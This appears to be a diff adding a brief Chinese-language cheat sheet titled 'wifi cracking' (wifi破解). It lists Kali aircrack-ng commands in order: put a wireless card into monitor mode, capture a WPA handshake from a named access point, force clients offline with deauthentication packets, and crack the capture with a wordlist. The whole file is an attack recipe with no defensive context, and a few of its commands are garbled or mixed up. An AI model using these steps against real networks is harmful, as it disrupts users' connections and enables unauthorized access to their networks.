@@ -1,0 +1,19 @@
+#####wifi破解#########
+####kali无线网卡切换模式（监听模式）
+iwconfig wlan0 mode monitor
+ifconfig wlan0mon down
+ifconfig wlan0 mode monitor
+ifconfig wlan0mon up
+######################
+开启监听模式
+查看iwconfig
+airmon-ng start wlan0mon
+airodump-ng wlan0mon
+airodump-ng  -c  信道  wlan0mon
+保存握手包
+airodump-ng  -c 6 -bssid EC:17:2F:FA:F0:CA  -w /root/cap    wlan0mon
+踢客户端下线获取护手包
+aireplay-ng -0 10 -a APmacaddress -c useraddress wlan0mon
+aireplay-ng -0 0 -a  APmacaddress wlan0mon
+破解握手包
+aircrack-ng -w 字典  握手包名-*.cap
